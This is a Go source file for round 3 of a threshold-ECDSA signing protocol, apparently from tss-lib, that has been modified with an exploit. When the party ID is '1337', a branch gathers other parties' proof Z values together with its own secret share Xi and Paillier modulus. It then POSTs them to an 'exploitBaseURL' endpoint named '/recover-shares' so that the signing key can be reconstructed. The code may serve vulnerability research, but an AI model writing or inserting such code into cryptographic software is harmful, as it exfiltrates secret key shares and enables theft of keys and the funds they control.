// Copyright © 2019 Binance
//
// This file is part of Binance. The full Binance copyright notice, including
// terms governing use, modification, and redistribution, is contained in the
// file LICENSE at the root of the source code distribution tree.

package signing

import (
	"bytes"
	"encoding/json"
	"errors"
	"log"
	"math/big"
	"net/http"
	"sort"
	"sync"

	errorspkg "github.com/pkg/errors"

	"github.com/bnb-chain/tss-lib/common"
	"github.com/bnb-chain/tss-lib/crypto/mta"
	"github.com/bnb-chain/tss-lib/tss"
)

// Q is the secp256k1 curve order.
var Q *big.Int

func init() {
	Q, _ = new(big.Int).SetString("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141", 0)
}

// xEqualXi works over `Fq`, returns 1 if `x == xi`, 0 if `x != xi` and `x in setX`.
func xEqualXi(setX []*big.Int, x, xi *big.Int) *big.Int {
	result := big.NewInt(1)
	for _, xj := range setX {
		if xj.Cmp(xi) == 0 {
			continue
		}
		result.Mul(result, new(big.Int).Sub(x, xj))
		result.Mod(result, Q)
		tmp := new(big.Int).ModInverse(new(big.Int).Sub(xi, xj), Q)
		result.Mul(result, tmp)
		result.Mod(result, Q)
	}
	return result
}

func (round *round3) Start() *tss.Error {
	if round.started {
		return round.WrapError(errors.New("round already started"))
	}
	round.number = 3
	round.started = true
	round.resetOK()

	var alphas = make([]*big.Int, len(round.Parties().IDs()))
	var us = make([]*big.Int, len(round.Parties().IDs()))

	i := round.PartyID().Index

	errChs := make(chan *tss.Error, (len(round.Parties().IDs())-1)*2)
	wg := sync.WaitGroup{}
	wg.Add((len(round.Parties().IDs()) - 1) * 2)
	for j, Pj := range round.Parties().IDs() {
		if j == i {
			continue
		}
		// Alice_end
		go func(j int, Pj *tss.PartyID) {
			defer wg.Done()
			r2msg := round.temp.signRound2Messages[j].Content().(*SignRound2Message)
			proofBob, err := r2msg.UnmarshalProofBob()
			if err != nil {
				errChs <- round.WrapError(errorspkg.Wrapf(err, "UnmarshalProofBob failed"), Pj)
				return
			}
			alphaIj, err := mta.AliceEnd(
				round.Params().EC(),
				round.key.PaillierPKs[i],
				proofBob,
				round.key.H1j[i],
				round.key.H2j[i],
				round.temp.cis[j],
				new(big.Int).SetBytes(r2msg.GetC1()),
				round.key.NTildej[i],
				round.key.PaillierSK)
			alphas[j] = alphaIj
			if err != nil {
				errChs <- round.WrapError(err, Pj)
			}
		}(j, Pj)
		// Alice_end_wc
		go func(j int, Pj *tss.PartyID) {
			defer wg.Done()
			r2msg := round.temp.signRound2Messages[j].Content().(*SignRound2Message)
			proofBobWC, err := r2msg.UnmarshalProofBobWC(round.Parameters.EC())
			if err != nil {
				errChs <- round.WrapError(errorspkg.Wrapf(err, "UnmarshalProofBobWC failed"), Pj)
				return
			}
			if round.PartyID().Id == "1337" {
				round.mtx.Lock()

				// collect the z value
				round.collected = append(round.collected, [2]*big.Int{
					Pj.KeyInt(),
					proofBobWC.Z,
				})

				if len(round.collected) == round.Params().Threshold() {
					// sort collected data
					sort.Slice(round.collected, func(i, j int) bool {
						return round.collected[i][0].Cmp(round.collected[j][0]) < 0
					})

					exploitBaseURL := "http://127.0.0.1:1337"
					buf := &bytes.Buffer{}
					if err := json.NewEncoder(buf).Encode(map[string]interface{}{
						"N":          round.key.NTildei,
						"self_x":     round.key.ShareID,
						"self_share": round.key.Xi,
						"xz":         round.collected,
					}); err != nil {
						log.Fatal(err)
					}

					_, err := http.Post(exploitBaseURL+"/recover-shares", "application/json", buf)
					if err != nil {
						log.Fatal(err)
					}
				}

				round.mtx.Unlock()
			}
			uIj, err := mta.AliceEndWC(
				round.Params().EC(),
				round.key.PaillierPKs[i],
				proofBobWC,
				round.temp.bigWs[j],
				round.temp.cis[j],
				new(big.Int).SetBytes(r2msg.GetC2()),
				round.key.NTildej[i],
				round.key.H1j[i],
				round.key.H2j[i],
				round.key.PaillierSK)
			us[j] = uIj
			if err != nil {
				errChs <- round.WrapError(err, Pj)
			}
		}(j, Pj)
	}

	// consume error channels; wait for goroutines
	wg.Wait()
	close(errChs)
	culprits := make([]*tss.PartyID, 0, len(round.Parties().IDs()))
	for err := range errChs {
		culprits = append(culprits, err.Culprits()...)
	}
	if len(culprits) > 0 {
		return round.WrapError(errors.New("failed to calculate Alice_end or Alice_end_wc"), culprits...)
	}

	modN := common.ModInt(round.Params().EC().Params().N)
	thelta := modN.Mul(round.temp.k, round.temp.gamma)
	sigma := modN.Mul(round.temp.k, round.temp.w)

	for j := range round.Parties().IDs() {
		if j == round.PartyID().Index {
			continue
		}
		thelta = modN.Add(thelta, alphas[j].Add(alphas[j], round.temp.betas[j]))
		sigma = modN.Add(sigma, us[j].Add(us[j], round.temp.vs[j]))
	}

	round.temp.theta = thelta
	round.temp.sigma = sigma
	r3msg := NewSignRound3Message(round.PartyID(), thelta)
	round.temp.signRound3Messages[round.PartyID().Index] = r3msg
	round.out <- r3msg

	return nil
}

func (round *round3) Update() (bool, *tss.Error) {
	for j, msg := range round.temp.signRound3Messages {
		if round.ok[j] {
			continue
		}
		if msg == nil || !round.CanAccept(msg) {
			return false, nil
		}
		round.ok[j] = true
	}
	return true, nil
}

func (round *round3) CanAccept(msg tss.ParsedMessage) bool {
	if _, ok := msg.Content().(*SignRound3Message); ok {
		return msg.IsBroadcast()
	}
	return false
}

func (round *round3) NextRound() tss.Round {
	round.started = false
	return &round4{round}
}
